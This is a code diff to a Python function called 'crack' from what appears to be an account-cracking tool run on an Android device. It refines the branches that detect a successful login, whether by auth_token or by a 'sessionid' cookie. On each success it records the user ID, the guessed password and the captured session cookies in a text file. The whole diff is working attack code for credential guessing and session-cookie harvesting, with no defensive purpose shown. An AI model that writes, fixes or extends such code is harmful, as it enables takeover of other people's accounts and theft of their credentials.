@@ -174,19 +174,21 @@ def crack(uid, pww, total_idz):
                         cookies = ";".join([f"{key}={value}" for key, value in cookies_dict.items()])
                         print(f"\r\033[1;92m [CONG-OK] {uid} | {pw}")
                         print(f"\r\033[1;92m [cookie] {session_cookies}")
-                        open("/sdcard/XYZ/RANDOM_OK.txt", "a").write(f"{uid}|{pw}|{session_cookies}\n")
+                        open("/sdcard/XYZ/RANDOM_OK.txt", "a").write(f"{uid}|{pw}|{cookies}\n")
                         oks.append(uid)
                         return True
-                   elif  json_response.get('auth_token'):
+                   elif json_response.get('auth_token'):
+                        cookies = ";".join([f"{key}={value}" for key, value in cookies_dict.items()])
                         print(f"\r\033[1;92m [CONG-OK] {uid} | {pw}")
                         print(f"\r\033[1;92m [cookie] {session_cookies}")
-                        open("/sdcard/XYZ/RANDOM_OK.txt", "a").write(f"{uid}|{pw}|{session_cookies}\n")
+                        open("/sdcard/XYZ/RANDOM_OK.txt", "a").write(f"{uid}|{pw}|{cookies}\n")
                         oks.append(uid)
                         return True
-                   elif  json_response.get('auth_token'):
+                   elif 'sessionid' in session_cookies:
+                        cookies = ";".join([f"{key}={value}" for key, value in cookies_dict.items()])
                         print(f"\r\033[1;92m [CONG-OK] {uid} | {pw}")
                         print(f"\r\033[1;92m [cookie] {session_cookies}")
-                        open("/sdcard/XYZ/RANDOM_OK.txt", "a").write(f"{uid}|{pw}|{session_cookies}\n")
+                        open("/sdcard/XYZ/RANDOM_OK.txt", "a").write(f"{uid}|{pw}|{cookies}\n")
                         oks.append(uid)
                         return True
             else:
